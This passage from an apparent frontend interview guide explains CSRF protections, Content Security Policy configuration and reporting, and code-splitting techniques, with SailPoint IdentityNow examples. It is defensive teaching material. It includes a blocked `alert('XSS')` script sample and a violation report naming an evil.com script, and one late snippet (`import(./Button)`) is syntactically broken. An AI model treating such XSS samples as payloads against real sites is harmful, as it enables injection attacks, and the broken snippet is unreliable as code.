  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

const csrfToken = getCookie('csrf-token');

fetch('/api/users/delete', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ userId: 'admin' })
});

// Server validates: cookie value === header value
app.post('/api/users/delete', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }
  
  deleteUser(req.body.userId);
  res.send('User deleted');
});
```

**4. Custom Request Headers**

```javascript
// Browsers don't allow custom headers on simple cross-origin requests
// Attacker cannot set custom headers from their site

// Client always sends custom header
fetch('/api/users/delete', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // Custom header
  },
  body: JSON.stringify({ userId: 'admin' })
});

// Server requires custom header
app.post('/api/users/delete', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Invalid request');
  }
  
  deleteUser(req.body.userId);
  res.send('User deleted');
});
```

**5. Origin/Referer Validation**

```javascript
app.post('/api/users/delete', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = [
    'https://identitynow.sailpoint.com',
    'https://identitynow-dev.sailpoint.com'
  ];
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).send('Invalid origin');
  }
  
  deleteUser(req.body.userId);
  res.send('User deleted');
});
```

**6. Re-authentication for Sensitive Actions**

```javascript
// Require password confirmation for critical actions
app.post('/api/users/delete', async (req, res) => {
  const { userId, password } = req.body;
  
  // Verify user's password
  const isValid = await verifyPassword(req.user.id, password);
  if (!isValid) {
    return res.status(401).send('Invalid password');
  }
  
  deleteUser(userId);
  res.send('User deleted');
});
```

**Complete CSRF Protection Example:**

```javascript
// Express middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply to all routes
app.use(csrfProtection);

// Provide token to client
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected route
app.post('/api/users/delete', (req, res) => {
  // CSRF middleware automatically validates token
  deleteUser(req.body.userId);
  res.send('User deleted');
});

// Client-side
// Fetch token on app load
let csrfToken;

async function initCSRF() {
  const response = await fetch('/api/csrf-token');
  const data = await response.json();
  csrfToken = data.csrfToken;
}

// Include token in all requests
async function deleteUser(userId) {
  await fetch('/api/users/delete', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ userId })
  });
}
```

**SailPoint Context:**

```javascript
// IdentityNow CSRF Protection:

// 1. All state-changing operations use POST/PUT/DELETE (never GET)
// 2. CSRF tokens on all forms
// 3. SameSite=Strict on session cookies
// 4. Custom X-CSRF-Token header on API requests
// 5. Re-authentication for:
//    - Deleting identities
//    - Changing access policies
//    - Modifying role assignments

// Example: Access request submission
async function submitAccessRequest(request) {
  const csrfToken = await getCSRFToken();
  
  const response = await fetch('/api/access-requests', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      'X-Requested-With': 'XMLHttpRequest'
    },
    credentials: 'include',
    body: JSON.stringify(request)
  });
  
  if (!response.ok) {
    throw new Error('Access request failed');
  }
  
  return response.json();
}
```

---

### Q4.3: Explain Content Security Policy (CSP) in detail

**Architect-Level Answer:**

CSP is a security layer that helps detect and mitigate XSS, clickjacking, and other code injection attacks by controlling which resources can be loaded.

**CSP Directives:**

```
Content-Security-Policy: <directive> <source>; <directive> <source>;

Common Directives:
- default-src: Fallback for other directives
- script-src: JavaScript sources
- style-src: CSS sources
- img-src: Image sources
- font-src: Font sources
- connect-src: AJAX, WebSocket, EventSource
- frame-src: <iframe> sources
- frame-ancestors: Who can embed this page
- media-src: <audio>, <video> sources
- object-src: <object>, <embed>, <applet>
- base-uri: <base> element
- form-action: <form> action attribute
- upgrade-insecure-requests: Upgrade HTTP to HTTPS
- block-all-mixed-content: Block HTTP on HTTPS pages
```

**CSP Sources:**

```
'none': Block all
'self': Same origin only
'unsafe-inline': Allow inline scripts/styles (avoid!)
'unsafe-eval': Allow eval() (avoid!)
'strict-dynamic': Trust scripts loaded by trusted scripts
'nonce-<value>': Allow scripts with matching nonce
'sha256-<hash>': Allow scripts matching hash
https:: Allow any HTTPS source
https://example.com: Specific domain
*.example.com: Wildcard subdomain
```

**Basic CSP Examples:**

```javascript
// 1. Strict CSP (most secure)
Content-Security-Policy: 
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

// 2. Moderate CSP (allows CDNs)
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.sailpoint.com;
  style-src 'self' https://cdn.sailpoint.com 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.sailpoint.com;
  frame-ancestors 'none';

// 3. Report-Only Mode (testing)
Content-Security-Policy-Report-Only: 
  default-src 'self';
  report-uri /csp-violation-report;
```

**Nonce-based CSP (Recommended):**

```javascript
// Server generates unique nonce per request
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader('Content-Security-Policy', `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}';
    style-src 'self' 'nonce-${nonce}';
  `);
  
  next();
});

// HTML includes nonce
<script nonce="<%= nonce %>">
  console.log('This script is allowed');
</script>

<script nonce="<%= nonce %>" src="/app.js"></script>

<!-- This script is blocked (no nonce) -->
<script>alert('XSS')</script>
```

**Hash-based CSP:**

```javascript
// Calculate SHA-256 hash of inline script
const script = "console.log('Hello');";
const hash = crypto.createHash('sha256').update(script).digest('base64');

// CSP header
Content-Security-Policy: 
  script-src 'self' 'sha256-${hash}';

// HTML
<script>console.log('Hello');</script> <!-- Allowed -->
<script>alert('XSS');</script> <!-- Blocked -->
```

**strict-dynamic (Modern Approach):**

```javascript
// Allows scripts loaded by trusted scripts
Content-Security-Policy: 
  script-src 'nonce-abc123' 'strict-dynamic';

// Trusted script (has nonce)
<script nonce="abc123" src="/app.js"></script>

// app.js can dynamically load other scripts
const script = document.createElement('script');
script.src = '/dynamic.js';
document.body.appendChild(script); // Allowed due to 'strict-dynamic'
```

**CSP Violation Reporting:**

```javascript
// CSP header with reporting
Content-Security-Policy: 
  default-src 'self';
  report-uri /csp-violation-report;
  report-to csp-endpoint;

// Report-To header (newer)
Report-To: {
  "group": "csp-endpoint",
  "max_age": 10886400,
  "endpoints": [{
    "url": "https://identitynow.sailpoint.com/csp-report"
  }]
}

// Server endpoint to receive reports
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body;
  
  console.log('CSP Violation:', {
    blockedURI: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    originalPolicy: report['original-policy'],
    documentURI: report['document-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number']
  });
  
  // Log to monitoring system
  logCSPViolation(report);
  
  res.sendStatus(204);
});

// Example violation report:
{
  "csp-report": {
    "blocked-uri": "https://evil.com/malicious.js",
    "violated-directive": "script-src",
    "original-policy": "default-src 'self'; script-src 'self'",
    "document-uri": "https://identitynow.sailpoint.com/dashboard",
    "source-file": "https://identitynow.sailpoint.com/app.js",
    "line-number": 42,
    "column-number": 15
  }
}
```

**CSP for Different Scenarios:**

```javascript
// Scenario 1: Static site (no inline scripts)
Content-Security-Policy: 
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self';
  font-src 'self';

// Scenario 2: SPA with API
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  style-src 'self';
  connect-src 'self' https://api.sailpoint.com;
  img-src 'self' data: https:;

// Scenario 3: Using Google Analytics, Fonts
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://www.google-analytics.com;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://www.google-analytics.com;

// Scenario 4: Embedded iframes
Content-Security-Policy: 
  default-src 'self';
  frame-src https://trusted-partner.com;
  frame-ancestors 'none'; // Prevent being embedded

// Scenario 5: Development (relaxed)
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-eval'; // For hot reload
  style-src 'self' 'unsafe-inline'; // For style-loader
  connect-src 'self' ws://localhost:*; // For WebSocket HMR
```

**CSP Best Practices:**

```javascript
// 1. Start with Report-Only mode
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;

// 2. Gradually tighten policy
// Week 1: Report-Only, monitor violations
// Week 2: Fix violations, update policy
// Week 3: Enforce policy
// Week 4: Remove 'unsafe-inline', 'unsafe-eval'

// 3. Use nonces for inline scripts
// ❌ Avoid
Content-Security-Policy: script-src 'self' 'unsafe-inline';

// ✅ Use nonces
Content-Security-Policy: script-src 'self' 'nonce-abc123';

// 4. Avoid 'unsafe-eval'
// ❌ Blocks eval(), new Function(), setTimeout(string)
eval('alert(1)'); // Blocked
new Function('alert(1)')(); // Blocked
setTimeout('alert(1)', 100); // Blocked

// ✅ Use safe alternatives
setTimeout(() => alert(1), 100); // Allowed

// 5. Set frame-ancestors to prevent clickjacking
Content-Security-Policy: frame-ancestors 'none';
// Or
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;

// 6. Upgrade insecure requests
Content-Security-Policy: upgrade-insecure-requests;
// Automatically upgrades HTTP to HTTPS
```

**SailPoint Context:**

```javascript
// IdentityNow CSP Configuration

// Production CSP
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}' https://cdn.identitynow.sailpoint.com;
  style-src 'self' 'nonce-{NONCE}' https://cdn.identitynow.sailpoint.com;
  img-src 'self' data: https:;
  font-src 'self' https://cdn.identitynow.sailpoint.com;
  connect-src 'self' https://api.identitynow.sailpoint.com wss://ws.identitynow.sailpoint.com;
  frame-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  block-all-mixed-content;
  report-uri /api/csp-violations;

// Benefits:
// - Prevents XSS attacks
// - Blocks unauthorized scripts
// - Prevents clickjacking
// - Enforces HTTPS
// - Monitors violations
```

---

## 5. Performance & Optimization

### Q5.1: Explain Code Splitting and Lazy Loading strategies

**Architect-Level Answer:**

Code splitting breaks your application into smaller chunks that can be loaded on demand, reducing initial bundle size and improving load time.

**Types of Code Splitting:**

**1. Route-based Splitting (Most Common)**

```javascript
// React with React Router
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Lazy load route components
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Certifications = lazy(() => import('./pages/Certifications'));
const AccessRequests = lazy(() => import('./pages/AccessRequests'));
const Admin = lazy(() => import('./pages/Admin'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<LoadingSpinner />}>
        <Routes>
          <Route path="/" element={<Dashboard />} />
          <Route path="/certifications" element={<Certifications />} />
          <Route path="/access-requests" element={<AccessRequests />} />
          <Route path="/admin" element={<Admin />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Bundle output:
// main.js (50KB) - App shell, router
// dashboard.chunk.js (30KB) - Loaded on /
// certifications.chunk.js (80KB) - Loaded on /certifications
// access-requests.chunk.js (40KB) - Loaded on /access-requests
// admin.chunk.js (120KB) - Loaded on /admin
```

**2. Component-based Splitting**

```javascript
// Lazy load heavy components
import { lazy, Suspense } from 'react';

const HeavyChart = lazy(() => import('./components/HeavyChart'));
const DataTable = lazy(() => import('./components/DataTable'));

function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  
  return (
    <div>
      <h1>Dashboard</h1>
      
      <button onClick={() => setShowChart(true)}>
        Show Chart
      </button>
      
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart data={chartData} />
        </Suspense>
      )}
      
      <Suspense fallback={<div>Loading table...</div>}>
        <DataTable data={tableData} />
      </Suspense>
    </div>
  );
}
```

**3. Library Splitting**

```javascript
// Split large libraries
// ❌ Bad: Import entire library
import _ from 'lodash'; // 70KB
import moment from 'moment'; // 230KB

// ✅ Good: Import only what you need
import debounce from 'lodash/debounce'; // 2KB
import { format } from 'date-fns'; // 5KB

// ✅ Better: Lazy load when needed
async function processData() {
  const { default: _ } = await import('lodash');
  return _.groupBy(data, 'category');
}
```

**4. Dynamic Import with Webpack Magic Comments**

```javascript
// Prefetch: Load during idle time
import(
  /* webpackPrefetch: true */
  './components/UserProfile'
);

// Preload: Load in parallel with parent
import(
  /* webpackPreload: true */
  './components/CriticalComponent'
);

// Chunk name: Custom chunk name
import(
  /* webpackChunkName: "admin-panel" */
  './pages/Admin'
);

// Multiple magic comments
import(
  /* webpackChunkName: "charts" */
  /* webpackPrefetch: true */
  './components/Charts'
);
```

**5. Conditional Loading**

```javascript
// Load based on user role
async function loadAdminFeatures() {
  if (user.role === 'admin') {
    const { AdminPanel } = await import('./components/AdminPanel');
    return <AdminPanel />;
  }
  return null;
}

// Load based on feature flag
async function loadBetaFeature() {
  if (featureFlags.newCertificationFlow) {
    const { NewCertFlow } = await import('./features/NewCertFlow');
    return <NewCertFlow />;
  }
  return <OldCertFlow />;
}

// Load based on device
async function loadMobileComponents() {
  if (window.innerWidth < 768) {
    const { MobileNav } = await import('./components/MobileNav');
    return <MobileNav />;
  }
  const { DesktopNav } = await import('./components/DesktopNav');
  return <DesktopNav />;
}
```

**6. Vendor Splitting (Webpack)**

```javascript
// webpack.config.js
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // Vendor chunk: node_modules
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          priority: 10
        },
        // Common chunk: shared code
        common: {
          minChunks: 2,
          name: 'common',
          priority: 5,
          reuseExistingChunk: true
        },
        // React chunk: React libraries
        react: {
          test: /[\\/]node_modules[\\/](react|react-dom|react-router-dom)[\\/]/,
          name: 'react',
          priority: 20
        }
      }
    }
  }
};

// Output:
// main.js - App code
// react.chunk.js - React libraries (cached long-term)
// vendors.chunk.js - Other node_modules
// common.chunk.js - Shared code between routes
```

**7. Progressive Loading Pattern**

```javascript
// Load critical content first, then enhance
function IdentityDashboard() {
  const [basicData, setBasicData] = useState(null);
  const [detailedData, setDetailedData] = useState(null);
  
  useEffect(() => {
    // 1. Load critical data immediately
    fetchBasicIdentityData().then(setBasicData);
    
    // 2. Load detailed data after
    setTimeout(() => {
      fetchDetailedIdentityData().then(setDetailedData);
    }, 100);
    
    // 3. Load analytics last
    setTimeout(() => {
      import('./analytics').then(({ trackPageView }) => {
        trackPageView('dashboard');
      });
    }, 1000);
  }, []);
  
  if (!basicData) return <Skeleton />;
  
  return (
    <div>
      <IdentityCard data={basicData} />
      {detailedData && <DetailedView data={detailedData} />}
    </div>
  );
}
```

**8. Intersection Observer for Lazy Loading**

```javascript
// Lazy load components when they enter viewport
function LazyComponent({ children }) {
  const [isVisible, setIsVisible] = useState(false);
  const ref = useRef();
  
  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) {
          setIsVisible(true);
          observer.disconnect();
        }
      },
      { threshold: 0.1 }
    );
    
    if (ref.current) {
      observer.observe(ref.current);
    }
    
    return () => observer.disconnect();
  }, []);
  
  return (
    <div ref={ref}>
      {isVisible ? children : <Placeholder />}
    </div>
  );
}

// Usage
<LazyComponent>
  <Suspense fallback={<Spinner />}>
    <HeavyComponent />
  </Suspense>
</LazyComponent>
```

**Performance Metrics:**

```javascript
// Measure code splitting impact
// Before code splitting:
// Initial bundle: 2.5MB
// Time to Interactive: 8.5s

// After route-based splitting:
// Initial bundle: 400KB (84% reduction)
// Time to Interactive: 2.1s (75% improvement)

// After aggressive splitting:
// Initial bundle: 150KB (94% reduction)
// Time to Interactive: 1.2s (86% improvement)
```

**Best Practices:**

```javascript
// 1. Split at route boundaries
// ✅ Each route is a separate chunk

// 2. Don't over-split
// ❌ Bad: Split every component
import(./Button); // 2KB component, not worth splitting

// ✅ Good: Split large components (>50KB)
import(./DataVisuali